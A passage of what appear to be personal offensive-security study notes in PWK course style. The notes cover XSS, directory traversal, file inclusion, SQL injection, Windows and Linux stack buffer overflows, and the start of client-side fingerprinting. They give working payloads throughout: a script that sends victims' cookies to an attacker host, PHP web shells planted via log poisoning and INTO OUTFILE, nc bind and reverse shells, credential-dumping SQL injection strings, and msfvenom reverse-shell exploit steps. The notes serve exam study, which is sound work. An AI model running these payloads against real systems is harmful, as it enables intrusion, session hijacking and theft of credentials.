                    and displays when they view a vulnerable page.
                    Can effect all users
                `reflected XSS` payload crafted in a request or
                    link. only effects single user
                `DOM-based XSS` only take place in sites DOM
                (document object model) Java can interact with it.
            #IDing XSS vulns    
                ID entry points, like search fields, and input special
                    charters ` <> ' ' { } ; ` and see if any return
                    unfiltered. If the web app doesn't remove or encode
                    the charters, it may be a tgt for XSS
            #basic XSS
                insert java script specific charters ` " ; < > ` in
                    an insert feild. Then when the page changes > `rc`
                    the results > `inspect element` to see if they were
                    removed or encoded, if not, lets XSS
                on the back end of the web app what we want is
                    where the web app stores our input without changing
                    it and then recalls it later to the page.
                `<script>alert(`XSS`)</script>` (with backtics
                    around XSS) a simple payload of
                    javaScript. when the page where the injection is
                    displayed is refreshed it will go off. In this case
                    its a simple pop up window with `XSS` on it.
                    (could be `'XSS'` as well, just sub back ticks
                    for single quotes)
                #img sources
                    some chat forum, chat, post systems allow img. if this is
                    unfiltered, insert a pic fake url and
                    with a `onerror=` run javaScript.
                    `<img src="http://noreal.com" onerror="javascript:alert(1)"/>`
                #img already loaded (with tabs)
                    if javascript is used to load img on the page when a url
                    is input, might be able to edit the url.
                    [web_page_code](web_page_code)
                    `' onerror='alert(1)';'` at the end of a url that is
                    calling an img
                #practice:
                    https://xss-game.appspot.com/level1
                    https://blog.dornea.nu/2014/06/02/googles-xss-game-solutions/
            #contect injection
                `<iframe src=http://<LHOST IP>/report height=”0” width=”0”></iframe>`
                    will inject an iframe that redirects the
                        victums browser to another location.
                        iframes are used to embed another file
                        within the curent htmp document. This makes
                        an "invisable" window cuz its size is 0x0
                        redirecting them to our `nc` listener
                    `nc -nvlp 80`
                        will listen for our scirpt on our LHOST
                            we could use this connection to connect the
                            victum to redirect to client side attack or
                            to info gathering script. Once they
                            leave the page the connection will drop
                            so be fast.
                    #stealing cookies and session info
                        if web app has insecure session managment
                            config we can steal cookie and act like
                            user. `PWK book p 310`
                        example: a `PHPSESSID` cookie is set when an
                            admin user logs in. Steal it and gain
                            access to the admins session.
                        `nc -nvlp 80`
                        `<script>new Image().src="http://<LHOST ip>/cool.jpg?output="+document.cookie;</script>`
                            once an admin log in, `nc` gets the
                            `PHPSESSID` cookie value we need.
                        add a new cookie in `Cookie-Editor` addon 
                            with correct name and cookie value and
                            then click the admin tab. We can now
                            browse as the admin. This is session
                            specific until they log out or session
                            expires.
        #Directory Traversal Vulns       
            display contents of a file not intended by web app setup.
            path traversal vulns, let attacker get access to files outside
            the web apps /root dir. These files are not normally accessed by 
            users. You can manipulate file paths but do not exicute code
            on the server. can be used with `file inclution` attacks.
            #ID and exploit directory traversal
                find file extensions in URL queries. if we see `file=xxx.php`
                    in a url, or any other extension, good indicator that code
                    is being executed from another source and pulling `xxx.php` out
                    of a dir. could get `/etc/passwd` on linux or `c:\boot.ini`
                    on windows. Poke at `file` changing it to `file=old.php` 
                    want to see an error with the full file path loc. the
                    file path will tell you if its `windows` or `*unix`.
                    for windows try: `file=c:\windows\system32\drivers\etc\hosts`
                    this is reliable and accessible by ANY user. If we
                    can view it then we know we can access files OUTSIDE
                    the web root dir.
            #file inclusion vuls
                include a file to a web apps code forcing it to run it.
                need to be able to execute code and write our shell payload
                somewhere.
                local: included file is loaded from same web server
                remote: included file is loaded from external source.
            #ID file inclusion vuls    
                locate params we can manipulte, exicute contents of file
                    within app, check params to see if they will accept
                    url instead of local path to open files (remote inclusion).
                modern php disables `RFIs`(remote file inclution)
            #local file incusions (LFIs)
                [example_php](example_php) since `include` exicutes any php code in
                    the file called, if we write php code in a file, save it
                    locally, and then call it up with `file=` it will run!
                #contaminating log files
                    log file posioning: most web servers log all url requests.
                        we request a fake url with php code in it, it gets saved in
                        the log, and then we point to the posioned log file in our
                        payload. when its read, the php code will be exicuted.
                    connect to the web server on port 80 with `nc -nv <ip> 80`
                    `<?php echo '<pre>' . shell_exec($_GET['cmd']) .  '</pre>';?>`
                        php code that runs `echo` to print to the page.
                        `'<pre>'`html tags and saves formating and results when `echo` 
                        prints our code stays in tact. `.  shell_exec($_GET['cmd']) .` 
                        executes os command via the query string and output
                        results in browser letting us call any cmd we want.
                    sending this payload give a `400 Bad Request` error but 
                        adds it to the web servers log file. now do LFI
                #LFI execution
                    point to local file with our malcode. construct url with
                    the cmd we want run.
                    `file=c:\xampp\apache\logs\access.log&cmd=ipconfig`
                    tells web server to view the contents of the log file we
                    posioned and when it reads and runs `cmd` we wan the
                    `ipconfig` cmd ran.
                    with this we can tell the web app to send us a `bind shell`
                    web app url: `cmd=nc -nlvp 4444 -e cmd.exe`
                    linux: `nc -nv <ip> 4444`
                        when linux connects to the ip, the web app sends
                        a `cmd shell`
            #remote file inclusion (RFI)
                less common but easier to exploit. needs server to have
                `allow url include` set to `on` newer versions have this 
                    set to `off` by default.
                check for this vuln by setting up `nc -nvlp 80` on kali
                    and on the php web app changing file to
                    `file=http:<kali ip>/evil.txt`
                    if a connection is made and closed than php has the url
                    include set to `on`. could point to any web server we
                    own.
                we can use the same payload as in LFI.
                    [php_cmd_payload](php_cmd_payload)
                    put in `/var/www/html/evil.txt` and start apache
                    web server `systemctl start apche2`
                    input RFI url in the php web app and send a cmd
                        `file=http://<ip>/evil.txt&cmd=ipconfig`
                    this a simple `web shell`: small piece of soft 
                        that provides web-based command line interface for
                        executing commands. for the most common look
                        in `/usr/share/webshells` just set LHOST and
                        LPORT in `php-reverse-shell.php` and `nc -nvlp <LPORT>`
                        to catch a shell.
            #expanding your repertoire with other http servers
                `python -m SimpleHTTPServer <any TCP port>`
                `python3 -m http.server <any tcp port>`
                    will host a dir from the current working path!
                `php -S <ip>:<port>`
                `ruby -run -e httpd . -p <port>`
                    `-run` replace common unix commands
                    `.` host current dir
                `busybox httpd -f -p <port>`
            #php wrappers
                protcal wrappers are filters
                if you can't poison a local php file use:
                    change `file=` to `file=data:<type>,<data>`
                        data wrapper will make the page treat it as a file
                        and include it in the page.
                    `file=data:text/plain,hello world`
                        will print hello world in plain text
                    `file=data:text/plain,<?php echo shell_exec("dir") ?>`
                        will run the cmd of `dir`
                    we can also get a `reverse shell`
                    `file=data:text/plain,<?php echo shell_exec("nc -nlvp 4444 -e mcd.exe") ?>`
                    connect form hack box `nc -nv <ip> 4444`
                    might be able to upgrade shell with `powershell`
                    from here we can:
                        edit a file that is displayed on the web server
                            such as a tab or page with XSS
                        from cmd shell `echo "<script>alert(`test`)</script>" >> menu.php`
                        now when ANYONE visists the page the script will
                            run becuase we changed it on the server side!
        #SQL injection        
            https://null-byte.wonderhowto.com/how-to/sql-injection-101-avoid-detection-bypass-defenses-0184918/
            https://programmer.group/the-use-of-jdbc-and-sql-injection.html
            caused by unsanitized user input via query and passed to database
                for exicution.
                Each table has entries (rows).Colums one part of that entry.
            #basic SQL syntax
                `SELECT * FROM users;`
                    show all columns and records(rows) in users table
                `SELECT username FROM users WHERE id=1;`
                    username field for user table showing records with ID 1
                `INSERT`
                `UPDATE`
                `DELETE`
                `1=1` always evaluates to true                        A
                `1=2` always evalutes to false
            #ID SQL injection vulns
                `'` SQL uses as string delimeter. if it produces a database
                    error then a vuln might be present. pass to every field
                    that might pass it to the database for testing.
                when a user logs in the SQL query might look like:
                    `$query = "select * from users where username = '$user' and password = '$pass'";`
                    so if we enter `'` we can escape the query.
                    $query = "select * from users where username =`''``' and password = '`password123' ";
                    if the page prints errors we might see `invalid query` and
                    might leak the SQL database software, server software, and
                    other fields from the database.
                Using the same example as the username and password, we can:
                    `select * from users where name = 'tom' or 1=1;#' and password = 'jones';`
                    this would change the statement to really be:
                    `select * from users where name = 'tom' or 1=1;` giving us
                    all records. it would return any toms or trues.
            #authentication Bypass
                logging into a webpage username = `tom' or 1=1 LIMIT 1;#`
                    this checks for tom or any true (which is all) but 
                    only returns the `LIMIT` number of records. We only
                    want one record cuz more than 1 might fail for a login.
                    Then we end the line with `;` and comment out the rest 
                    of the query with `#` because we are not sure what the rest does.
            #enum the database
                we need colume and table names to craft exploits. If a web page
                    is using php we might could check the
                    `http://target.com/debug.php` and then change our ID to `'`
                    `debug.php?id='` if we get a syntax error, it might be vuln
                #column number enum
                    `order by`
                        `debug.php?id=1 order by 1` will sort the database by
                        1st column, keep incrementing this until an error
                        which tells tell us the number of columns.So if we
                        error out on `order by 4` we know there is 3 columns.
                        can use `burp suite repeater` for this.
                            *url encoding for a space is `%20`
                            send an order by request and see it in `burp`.
                            then `rc` > `send to repeater` > send. Then search
                            in the response for `error`. edit the request
                            incrementing each time and watching the `0 matches`
                            next to search at the bottom of response for 
                            the error.
                #understanding layout of the output (PWK p.338)
                    once we know how many columns we have use `union`. Not all
                    columns may be displayed, such as an `id` or `key` value.
                    `union all select 1,2,3` will display `1` row of `2`
                    columns with values of `1,2, and 3`. this will label for us
                    which columns have which numbers that we can see as the
                    last entry. Look for columns that have a lot of space 
                    for payloads.We will use this to find info about the db.
                    for the example db it only shows columns 2 and 3
                #extracting data from db
                    now that we understand the layout we can ask for data
                        and have it displayed in specific column locations.
                        we can use `union all select 1,2,3` and add diffrent
                        commands in one of the columns such as `1,2,@@version`
                        so version will be printed in the 3rd column.
                    `@@version` will print the version of a MariaDB
                    `()user` current database user
                    `table_name from information_schema.tables` shows us table
                        names.then we can get column names from that table.
                    `column_name from information_schema.columns where table_name='users'`
                        will print out all the column names for the users table
                        so if we see two column names `username` and `password`
                    `union all select 1,username, password from users`
                        will print all usernames in 2nd field and passwords
                        in the 3rd field. passwords might be hashed or in
                        plain text
                    #h2 database JDBC
                        `') order by 5;--'`
                            order to figure out how many columns you have
                        `fake%') or 1=2 union all select 1,2,3,4,5;--'`
                            we find out that the page is set up with columns:
                            2
                            4
                            3
                        `fake%') or 1=2'`
                            fake will find no results and 1=2 is false. we want
                            to use this with extra injection code to be sure
                            that our real search gets nothing without error and
                            our injection code, `union`, gets us results
                            without error
                        `fake%') or 1=2 union all select 1,2,name,4,5 from items;--'`
                            will print the value `name` from the `items` table
                            in the 3rd column
                        `fake%') or 1=2 union all select 1,2,table_name,4,5 from information_schema.tables;--'`
                            prints all `table names` to the 3rd column as
                            grabbed from the info schema
                        `fake%') or 1=2 union all select 1,2,username,4,5 from users;--'`
                            prints out all data from `username` column of the
                            `users` table
                        `fake%') or 1=2 union all select 1,2,password,4,5 from users;--'`
                            same for passwords
                #from SQL injection to code execution
                    depending on OS, service privs, and file permissions
                        for a windows server we can check to see if we can load
                        a file and read it with `union all select 1,2,3` by
                        replacing 3 with `column_name from information_schema.columns where table_name='host'`
                        this should load the hosts file and display it.
                    we can use `INTO OUTFILE` to create malicious PHP file
                        to the servers web root dir. we can get this from
                        the SQL db sysntax error of `'`
                        `union all select 1, 2, "<?php echo shell_exec($_GET['cmd']);?>" into OUTFILE 'c:/xampp/htdocs/backdoor.php'`
                        this might syntax error but might have been saved. go
                            access the file to be sure.This one liner makes a
                            new page on the site. So go there and pass it a
                            `cmd` such as `whoami` to see if it worked with
                            `http://target.com/backdoor.php?cmd=whoami`
                    can use `cmd=` here with `nc` to send us reverse shell
                #automating SQL injection
                    `sqlmap -u http://tgt.com/debug.php?id=1 -p "id"`
                        `-u` url
                        `-p` parameter
                        will issue multiple request to probe if a para is vuln
                            to SQL injection, check for the database type and
                            alter to try to id exploit payloads to use on that db.
                            will end with showing payloads that worked.
                    `sqlmap -u http://tgt.com/debug.php?id=1 -p "id" --dbms=mysql --dump`
                        `--dbms` sets MYSQL as the backend type (type of
                        database) Maria and mysql are treated the same
                        `--dump` to dump all tables in db
                        dumps all tables to terminal and creates a .csv file
                        with tables. `sqlmap` can bypass web application
                        firewalls (WAF) and execute complex queries to automate
                        taker of a server.
                    `sqlmap -u http://tgt.com/debug.php?id=1 -p "id" --dbms=mysql --os-shell`
                        will attempt to get a shell via the db on the websever
#buffer overflows
    memory corruption vuln focused on the `stack`
    1.) discover vuln
    2.) create input to get control of CPU registers
    3.) manipulate memory to get reliable remote code execution
    #x86 architecture
        #Program memory 
            lowest memory address   0x00000000  
                                                stack
                                                program image
                                    0x00400000  process environment block (PEB)
                                                thread environment block (TEB)
                                                heap
                                                
                                    0x7FFDF000  dynamic link library (DLL)
                                    0x7FFFFFFF  
            highest memory address  0xFFFFFFFF  kernal memory space
            
            the `thread` executes code from the `program image` or the `DLLs`.
                The `thread` requires a temporary data area, which is the `stack`, 
                for vars, functions, and program control info. Each `thread` in an
                app has its own `stack`. CPU views the stack memory as `last-in first-out`
                (LIFO) so items put (PUSHed) on top of stack are removed (POPped)
                first. `PUSH` and `POP` are `assembly` instructions.
            when a thread calls a function it must know which memory address
                to return once the function completes. The parameters and `return adress`
                are stored on the stack:
                    (stack)
                    function A reutrn address:  0x00401024
                    parameter 1 for Function A: 0x00000040
                    parameter 2 for Function A: 0x00001000
                    parameter 3 for Function A: 0xFFFFFFFF
            When the function ends, `return address` is taken from stack to
                restore execution flow back to main or function
            #CPU registers (PWK p. 353)
                uses 9 32bit registers as storage locations
                General Purpose Registers:
                    `EAX` (accumulator): Arithmetical and logical instructions
                    `EBX` (base): Base pointer for memory addresses
                    `ECX` (counter): Loop, shift, and rotation counter
                    `EDX` (data): I/O port addressing, multiplication, and
                    division
                    `ESI` (source index): Pointer addressing of data and source
                    in string copy operations
                    `EDI` (destination index): Pointer addressing of data and
                    destination in string copy operations
                `ESP` - the `stack` pointer. keeps track of most recently
                    referenced location on stack by storing a pointer
                    to it. This POINTS to the TOP of the stack and would be the first
                    thing ran if the stack is popped.
                `EBP` - the `base` pointer. stores a pointer to the top of the
                    stack when a function is called so when a function needs to
                    access its stack frame (via offsets) it can come back to this
                    pointer. This POINTS to the BOTTOM of the stack and would
                    be the LAST thing ran if the stack is popped.
                `EIP` - instruction pointer. Always points the next code
                instruction to be executed. This directs the flow of a program.
            #the Stack
                first in last out (FILO) like plates in a buffet spring loaded
                holder. the last plate inserted is removed first.
            #buffer overflow walkthrough
                ImmunityDebugger - id a buffer overflow vuln on a tgt, download
                    software or app, run thru ID, figure out buffer overflow, then
                    do on tgt.
                upper left - assembliy window (instructions): blue highlight is next to
                    be exicuted and the far left is its memory location.
                upper right - registers (`EIP` and `ESP` we care about). The
                    `EIP` is allways going to point to the highlighted blue in the
                    upper left paine.
                lower right - stack and contents that has four columns:
                    memory address, hex data (32bit value `DWORD`) at address, ASCII rep of data,
                    dynamic conmentary. the highlighted top of the stack is the
                    `ESP`
                lower left - contents of memory at addresses. can `rc` to
                    change how you view it.
                very bottom right tells you what is currently happening.
                `Debug` > `step into` or `step over` will run the program one
                    peice at a time. `step into` to get into a function
                    begining and then stop. `step over` will run the entire
                    function and then return.
                [example_code_to_overflow](example_code_to_overflow)
                Need to find the `Main` function. if we know a string in main
                    we can search for it: `rc` > assembly window > search for 
                    >  all referenced text strings.
                highlight a `CALL` and press `F2` to set a `breakpoint` on the
                    strcpy CALL line
                Debug > run (or press F9) will run the code and stop right
                    before the breakpoint.
                Debug > step into twice (or F7 F7) will step us into the `strcpy`
                    function and change the assembly window.
                in the `stack window`, double click the `dest` address where our
                    `src` will be saved to follow it. double clicking the address
                    will change their view to show `relative offsets` from where we
                    double clicked instead of real addresses.
                the `dest` address is the begging of the buffer which is 64
                    bits in this code. So this buffer extends from `==>` our
                    start to `+40`. If there is other data in the buffer area
                    it is becuase the buffer was cleared first. It will be over
                    written when the program runs.
                `CALL`, `dest`, and `src` are all connected with a line. the
                    top of the stack window has `CALL` at it and this is the
                    `return` address that we will go to when the `strcopy` is
                    finished
                finished the `strcopy` function with Debug > execute till
                    return (Ctrl+F9) to let it finish.
                In the assembly window it has paused at the `RETN` which is the
                    last command of the `strcop` function. now the computer looks
                    to the `EIP` to know where to go to next, which is the next
                    spot after the `strcopy` function in the `main`. in our example
                    it is `return 0` so the assembly windows will show `MOV EAX, 0`
                    which is exit status 0 to the OS. then `LEAVE` and finally
                    `RETN`
                the `RETN` is the main function exiting and then returning to
                    the parent function. if we can change the `RETN` address
                    we can control what happens next.
                When the assembly window gets to the `RETN` of main check the
                    stack window to see how far that is from where we doubl clicked
                    the buffer start. in our case its `4C` which is hex for 76
                    (bytes) so if we supply 80 As we would overflow into the `RETN`
                    address. * 1 letter takes up 1 byte.
                #overflowing the buffer
                  AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA  
                  find `strcpy` location. breakpoint will be saved accross
                      debugging sesstions.
                  `F9` to run to breakpoint
                  `F7` to step into `strcpy` function
                  double click the starting buffer
                  `Ctrl+F9` to exicute up to the `strcpy` return
                  If we keep running the overwritten A's on the `EIP` will be
                      when the main function `RETN` and the program will crash.
                  *the `EIP` is used to exicute code at a location at the
                      assembly level. So if we change the `EIP` to point to a
                      memory location where we have ANY assembly code the CPU will run
                      it and eventually shell code to get a reverse shell.
    #Windows Buffer Overflows (Sync Breeze Enterprise)
            #buffer overflow steps
            1. fuzz an app's input field to check for crash
            2. replicate the crash
            3. control the `EIP`
            4. locate space for `shellcode`
            5. check for bad chars
            6. redirect execution flow (hard code `JMP`) !!! `EIP`: register
               address only / anything `else` (ECX, ESP, ect) code only !!!
            7. generate shell code
            8. get reverse shell
            9. improve code
            https://liodeus.github.io/2020/08/11/bufferOverflow.html
        #discovering the vuln
            #1. fuzz an app's input field to check for crash
            `fuzzing`: give an app input that is not handled correctly, crash
                it. this might indicate that it has a vuln. fuzz every input
                field on the app and hope for a crash. When one field crashes,
                that might have a vuln. our example its `username`
            to craft a native fuzzer by hand, we need to see the http traffic
                from the `username` field. set up wire share with a filter to
                just see traffic between tgt and hack box `host <hackbox ip> and host <tgt ip>`
            use browser to log into sync breeze with fake creds to see packets.
                find the `GET /login` and rc > follow > TCP steam to see how
                the packets handle the login.
            start buildng the fuzzer with a python proof of concept script
                to attempt logings with longer and longer buffers each time.
                In this case it will use http POST requests to try to login
                with longer and longer usernames.
				[python_POC_fuzzer](python_POC_fuzzer)
            use `microsoft TCPView` to figure out what process from SB is
                listening on port 80 for the login. Options > uncheck resolve
                address > then sort by port for 80. `syncbrs.exe` is our
                target.
            #2. replicate the crash
            attach debugger to sync breeze to catch access violations with
                file > attach > syncbrs.exe (need to run as admin)
                *anytime we attach a process it will pause: `F9` to resume.
                and then run our fuzzer.
            should get `access violation when executing [41414141]` this shows
                the `EIP` at `AAAA` so we overwrote the buffer into the `EIP`
                we see this when the fuzz sent about `800` bytes.
        #win32 buffer overflow exploitation
            #fuzzing
                * when fuzzing if program keeps making new threads it might not
                    accept buffers too big or too small. Using halfing method, get
                    the app to crash. There might be a buffer "sweet spot" size.
                    Then either increase size or decrease size tell the `EIP` 
                    is overwritten then do binary tree analysis
            [win32_BO](win32_BO)
----------------------------------------------------------------------
`EIP` takes registry addresses ONLY! anything `else` (ECX, ESP, ect) takes
hard code ONLY no addresses!!!
----------------------------------------------------------------------
            #3. control the EIP
            need to gain control of the `EIP` register
            need to find the exact number of bytes to get us to the `EIP`
                could do `binary tree analysis` send 400 As and 400 Bs and see
                if its As or Bs that overrite the buffer. keep splitting this
                tell we find the 4 bytes hit the `EIP` this will take 7 times
            faster way is to use non repeating 4 byte chucks to pinpoint where
                they are located.`msf-pattern_create -l 800` will do this for
                us and add this to our script.
            `EIP` is 42306142 which is hex for B0aB. now use `msf-pattern_offset -l 800 -q 42306142`
                `-l` length of original string
                `-q` hex for the 4 bytes in `EIP`
                says the offset is located at 780 so the `EIP` starts at 781
                    id the `EIP` with a new script to be sure [win32_BO_offset_known](win32_BO_offset_known)
                    we see that our 4 B's are the `EIP` so we no control the
                    `EIP`
            #4. locate space for shellcode
            now we can put any memory address that we want in the `EIP` that
                will point to our malcode. standard reverse shells are 350-400
                bytes in length so we need to find a place to store that. We
                only have 16 C's in our overflow so we can change the length to
                around 1500 and see if we can expand the C's area to hold our
                shell code. [win32_BO_expander](win32_BO_expander)
                #no room for the expander
                    sometimes you might have the `ESP` directly after the `EIP`
                        and/or you only have a handful of bytes starting at the
                        `ESP`. Instead of putting shell code after the `EIP`
                        starting with `nops` at the `ESP` location followed by
                        shell code, we can hard code a `jmp offset` command to jump
                        to the start off our buffer and place our `nops` and
                        `shellcode` there.
                    figure out the offset from the `ESP` by double clicking it in
                        the stack view of imulity to get `==>` and find the offset at
                        near the start of your buffer. example +820
                    make a vim file called `test.c` with: `asm("jmp .-0x820\n");`
                        `gcc -c test.c` to compile it, it will create `test.o`
                        `objdump -d test.o` to get a print of the code:
                            [result](result) 		0:	e9 db f7 ff ff
                    or you can use `msf-nasm_shell` and then `jmp esp` or for a
                        short jump `jmp short 12` 
                    to hardcode your jump to offset from current insert into
                        your poc: `jmp = "\xe9\xdb\xf7\xff\xff"` after your `EIP`
                        var address and put your `nops` and `shellcode` higher in
                        your poc.
                    [no_room_4_expander](no_room_4_expander)
                in immunity, can see our D's in the buffer. double click bottom
                    left window on the first set of D's to get relative distance
                    and see how much space we have for shell code. D's end at hex
                    2C4 which is 708 bytes of space for our shell code. we see that
                    the `ESP` points to the start of our D's.
                    * if it has Structured exception handling SEH:
                        https://memn0ps.github.io/2020/01/27/Stack-Based-Buffer-Overflows-SEH-Part-2.html
            #5. check for bad chars
                *may need to do `redirecting execution flow` first if you
                    had `no room for expander`!!!!!
                need to check for bad charaters such as the `null byte` `0x00`
                    which ends strings in C. also `0x0D` which is the end of a
                    field. bad charaters will end our code too soon.
                    can send all charaters `00x00 - 0xFF` as part of the buffer to
                    see how the app deals with the charters after a crash.
                    [bad_chars_checker](bad_chars_checker) in immunity, rc on `ESP`
                    and follow in dump to see the hex charaters and ascii
                    a `00` means it failed we see that after `09` it fails 
                    so the next char `x0a` is a bad char. remove it from the 
                    script and run again. rinse and repeat until you remove
                    all bad chars. ex. \x00\x0a\x0d\x25\x26\x3d
                * if the program doesn't crash correctly, like making new threads
                    forever, just step through the bad chars halfing at a time tell you
                    find the one that causes the issue and go from there.
                common bad chars:
                    \0x00\ null byte
                    \x0a\ line feed n
                    \x0d\ cariage return r
                    \xff\ form feed f
            #6. redirecting the execution flow
                need the `EIP` to point at the `ESP` so we can force the app to
                either run `shellcode` or run a `first stage`.However, `ESP`
                changes each time the program crashes. So we need to find a
                `JMP ESP` hard coded somewhere and set the `EIP` to THAT
                address. This is because each thread has its own stack
                allocation in memory.
                #finding a return address
                need a staic `JMP ESP` address and most windows libraries have then
                    other then ASLR supported ones. also need to be sure the
                    address has no bad chars in it because we have to hard code the
                    address into the `EIP`
                * be sure app is running and NOT paused!
                * some address will change with locally ran BOs if the app can
                      handle a browes or drag and drop!
                in the bottom bar of immunity `!mona modules` to see all DLLs
                    and such. The flags in the middle of the output are 
                    memory protections. we want one that has all `false` 
                    so we know that it will reliably load at
                    the same address each time. also check that the `base` and
                    `top` address do not start with `0x00` because that is a bad
                    char. in this case `libspp.dll` will work
                `msf-nasm_shell` and then search for `jmp esp` to get the code
                    `FFE4` so we can search `libsapp.dll` for a jump memory
                    location. then search immunity `!mona find -s "\xff\xe4" -m "libspp.dll"`
                    `jmp esp`   FFE4
                    `jmp ecx`   FFE1
                    `jmp edx`   FFE2
                * setting a breakpoint (blue arrow with 3 dots) allows 
                     you to single step thru debugger with `F7`
                * then click the blue button with an arrow and 4 dots, put in that
                    address to go there and confirm its a `JMP ESP`. if we overwrite
                    the `EIP` with this address, the program will go to that
                    address and execute a `JMP ESP` operation and our
                    `shellcode` or `first stage` is at the `ESP` and will be
                    ran.
                    [win32_BO_eip_tester](win32_BO_eip_tester)
                add address to script in reverse order due to endian byte order.
                    lil endian is widly used, big endian is more rare. run to check
                    and when you hit the break point press `F7` to get into the
                    funtion which should be all D's where we will put our shell
                    code. 
                    * if `JMP ESP` address is `0x148010cf` we change put
                        it in reverse order in our poc as: `esp = "\xcf\x10\x80\x14"`
            #7. generate shell code with metasploit
                `msfvenom -p windows/shell_reverse_tcp LHOST=<hackbox ip> LPORT=443 -f c`
                    `-f c`  is for C code.
                check for bad charaters. so we can encode this a different way
                    or get rid of bad charters with:
                    `msfvenom -p windows/shell_reverse_tcp LHOST=<hackbox ip> LPORT=443 -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"`
                        `shikata_ga_nai` is a polymorfic encoder
                        `-b` are known bad chars
            #8. getting a shell
                replace our D's buffer with shell code in script.
                [win32_BO_reverse_shell](win32_BO_reverse_shell)
                if we run the script it will fail because the tgt needs to add
                    a stub to the program to decode our encoded shell code. when
                    the `GetPC` runs it will overwrite a few bites of the decoder
                    as its saved in mormory becasue it is too close to it in
                    memory. to fix this we will make a bigger
                    landing pad so there is enough room for the decoder to work and
                    not be overwritten.
                #nops
                just add `0x90` with are NOPs meaning no operations just pass
                    on. So we add a `NOP slide` of about 10 to the front of our code as a
                    landing pad so its not overwritten. This ensures that the
                    stack pointer is far enough away from the shell code to not
                    overwrite it with GetPC.
                    [win32_BO_reverse_shell_with_nops](win32_BO_reverse_shell_with_nops)
                set up nc: `nc -lnvp 443` and run the buffer overflow
                when you get a shell `whoami` and see that you have `nt authority\system`.
                    if you overflow a program with system permissions you get a
                    system shell which is admin
                however, when we exit the shell the service on the tgt will
                    crash. 
            #9. improving the exploit
                metasploit defualt exit is `ExitProcess` so it will kill whatever
                    it is on when it exits. we can fix this. if its a threaded
                    process we can try to exit with `ExitThread` and shouldn't
                    crash the service by just exiting the thread.
                    `msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.203 LPORT=443 EXITFUNC=thread -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"`
                        `EXITFUNC=thread` tells it to exit the thread and not
                        the process
        #linux buffer overflows (crossfire game)
            modern linux kernels have protections such as DEP, ASLR, and
                Canaries
            rdesktop to debian > terminal > `/usr/games/crossfire/bin/crossfire`
                to launch game.
            #replicating the crash
                launch EDB debugger with `edb` > file > attach. windows are the
                    same as immunity.
                `F9` to run (unpause) or click icon.
                [lin_poc](lin_poc) running lin_poc overflows the `EIP` with `A`s
                the exploit is targeting the setup sound so in our poc we
                    need specific hex values at the start and end of our buffer
                    and setup sound cmd.
            #controlling EIP
                need to find out the exact 4 bytes that land on the `EIP` with
                    `msf-pattern_create -l 4379`
                [lin_eip](lin_eip) `eip` is 46367046 and checking with
                    `msf-pattern_offest -l 4379 -q 46367046` offset is 4368
                [lin_eip_checker](lin_eip_checker) as land on the `eip`.
					also see our 7 `C`s start at the `ESP`
            #locating space for our shell code
                `ESP` points at the end of our buffer and only give us 7 bytes
                    of space.`EAX` points to the beginning of the buffer.
                    However, our buffer start is the required `setup sound` cmd
                Copy `EAX` and in top left windows > rc > go to expression
                > `0x<paste EAX>` shows that `setup sound` translates as:
                    se(\x73\x65): `JAE`(jump short if above or equal) which jumps to an
                        address in our controled buffer.
                    tu(\x74\x65): `JE`(jump short if equal) to another address in
                        buffer
                    so these could work but there is an easyer way
                `1st stage shell code` at the `ESP` (7 bytes)(\x0C) will allow us to jump
                    to after `sound setup` and run `reverse shell code`
                need to increase the size of the `EAX` by 12 bytes
                    for `setup sound` becuase we need to keep it in place.
                    we need an `ADD` assembly instruction and then to
                    jump to the memory pointer of `EAX` with `JMP`
                `msf-nasm_shell`
                    `add eax,12` which is `83C00C`
                    `jump eax`  which is `FFE0`
                    both are 5 bytes in total so we have room
                    *do NOT put in backwards, thats addresses only
                [lin_first_stage](lin_first_stage) we see that if we follow
                    the `ESP` in dump, that our first_stage is there
                    added first_stage of 5bytes and then 2 nops at the end
            #checking for bad chars
                after checking we find `\x00\x20`
            #finding a return address
                in `edb` > Plugins > OpcodeSearcher > select the region
                    for our app. right side > `ESP` -> `EIP` and look for
                    `jump esp`
                Plugins > breakpoint manager > add the `jump esp` address
                    `0x08134596` set our `EIP` to that in lin_first_stage 
                    and run
                edb will stop at our break point of `jmp esp` single step
                    with `F7` and should land at our first stage shell code
                    which sets the `EAX` to `EAX+12` (right after setup sound) and
                    and `F7` again jumps to `EAX+12` the begining of our `A`s
            #getting a shell
                drop our reverse shell at the start of our `A`s
                `msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.119.203 LPORT=443 -b "\x00\x20" -f py -v shellcode`
                    *if a random letter like `b` shows up in your code remove them*
                [lin_reverse_shell](lin_reverse_shell)
                    placing the shellcode close to the start of our buffer
                    means we need to padd it with `A`s so we minus it and the
                    nops from our last padding to maintain the orgianl offset
                    to overwrite the `EIP`
                set up nc: `nc -lvnp 443` and send exploit. we get a connection
                    on `nc` but it is stuck.This is becuase `edb` pauses the
                    program. simply un-pause and you can run a command. you
                    need to press ok and unpause on each command because the
                    debugger catches the child process of the shell. To test
                    simply restart the app without the debugger and run
                    explolit. You got a shell!
                `id` will give you uid, groups, gid    
#client side attacks
    client attacks target weaknesses in client software and not the server
    #active client info gathering
        use social engineering to get a person to help us in a client side attack 
            such as opening malware hidden in something else.
        #client fingerprinting
            we need to know what versions of what are on tgt. If they will
                come to our malicious site, we can use fingerprints to gather
                info on the tgt. example is a java fingerprints
            cd to `/var/www/html` and ensure there isn't an `fp` dir
            `cd /var/www/html/ && sudo wget https://github.com/fingerprintjs/fingerprintjs/archive/2.1.4.zip && sudo unzip 2.1.4.zip && sudo mv fingerprintjs-2.1.4/ fp/ && cd fp`
            [index_html](index_html) or [fingerprint](fingerprint)
			now when a tgt goes to `http://<hackbox ip>/fp/index.html`
            their browser will be fingerprinted to them.
                `userAgent` gives us: installed browsers, plugins, versions /
                    generic info about the underlying OS
            submitting the `userAgent` to https://developers.whatismybrowser.com/
                gets us more info on: browser versions and OS that was used to
                    go to our site
            however, the user KNOWS they are being fingerprinted so we want
                to sent their fingerprint back to our self hosted web server.
            * `sudo chown www-data:www-data fp` will change the owner of `/fp`
                to `www-data` so our `fingerprint.txt` can be written
            use [fingerprint_2_server](fingerprint_2_server) to report back to
